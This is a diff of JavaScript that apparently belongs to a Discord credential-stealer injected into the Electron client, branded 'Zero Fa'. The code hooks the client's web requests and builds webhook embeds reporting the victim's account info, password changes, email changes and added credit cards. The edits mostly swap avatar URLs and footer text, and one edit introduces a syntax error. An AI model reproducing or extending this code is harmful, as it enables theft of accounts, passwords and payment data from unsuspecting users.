@@ -194,10 +194,10 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         var params = {
             username: "Zero Fa",
             content: "",
-            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
+            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "color":2560,
+                    "color": 2560,
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -215,7 +215,8 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Zero Fa By zero"
+                        "text": "Zero Fa By Zero"
+                    }
                 }
             ]
         }
@@ -245,10 +246,10 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             var params = {
                 username: "Zero Fa",
                 content: "",
-                avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
-                        "color":2560,
+                        "color": 2560,
                         "fields": [
                             {
                                 "name": "**Password Changed**",
@@ -271,7 +272,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Zero Fa By zero"
+                            "text": "Zero Fa By Zero"
                         }                 
                     }
                 ]
@@ -301,12 +302,12 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     `, true).then((ip) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Zero Fa",
+            username: "Zero fa",
             content: "",
-            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
+            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "color": 2560,
+                    "color": Zero Fa By Zero,
                     "fields": [
                         {
                             "name": "**Email Changed**",
@@ -329,7 +330,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "zero Fa by zero"
+                        "text": "Zero Fa By Zero"
                     }                
                 }
             ]
@@ -364,7 +365,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
-                    "color":2560,
+                    "color": 2560,
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
